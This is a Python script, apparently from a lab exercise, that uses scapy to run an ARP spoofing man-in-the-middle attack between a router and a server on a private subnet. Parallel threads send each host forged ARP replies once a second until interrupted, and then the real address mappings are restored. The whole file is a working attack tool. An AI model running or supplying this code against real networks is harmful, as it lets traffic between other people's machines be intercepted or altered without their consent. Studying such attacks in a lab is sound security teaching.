from scapy.all import *
import scapy.all as scapy
from scapy.layers.l2 import ARP
import threading

def getMac(ip): # Function to get the MAC address of an IP
    arp_req_frame = scapy.ARP(pdst=ip) # Create an ARP packet

    broadcast_ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Set the MAC broadcast address to get the MAC address of an IP
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout=1, verbose=False)[0] # Send the packet and wait for a response from the specified IP
    return answered_list[0][1].hwsrc # Return the MAC address of the IP

attacker_mac = "02:42:c6:07:00:03"
router_ip = "198.7.0.1"
router_mac = getMac(router_ip)
server_ip = "198.7.0.2"
server_mac = getMac(server_ip)

def poison(target_ip, target_mac, gateway_ip, stop_event): # Function to send ARP packets to a specified target
    packet_poison = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip) # op=2 means it's an ARP Reply packet
    # pdst is the target IP address, hwdst is the target MAC address
    # psrc is the source IP address that asked for the target MAC address
    while not stop_event.is_set(): # While CTRL+C is not pressed, send the ARP packets
        send(packet_poison, verbose=False)
        logging.info("Packet sent")
        time.sleep(1)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet_renew = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet_renew, verbose=False)
    logging.info("ARP cache restored")
    # In this function, send packets with the real MAC and IP addresses to restore the connection

router_stop_event = threading.Event() # Events to stop the threads
server_stop_event = threading.Event()

# Start the threads to send ARP packets to the router and server in parallel
router_thread = threading.Thread(target=poison, args=(router_ip, router_mac, server_ip, router_stop_event))
server_thread = threading.Thread(target=poison, args=(server_ip, server_mac, router_ip, server_stop_event))

router_thread.start()
server_thread.start()

a = 1
try:
    while a == 1:
        a = 1
except KeyboardInterrupt: # In case CTRL+C is pressed, execute the connection restoration function and stop the threads
    router_stop_event.set() # Set the event to stop the thread
    server_stop_event.set()
    restore(router_ip, router_mac, server_ip, server_mac)
    restore(server_ip, server_mac, router_ip, router_mac)
    logging.info("ARP cache restored")
    exit(0)
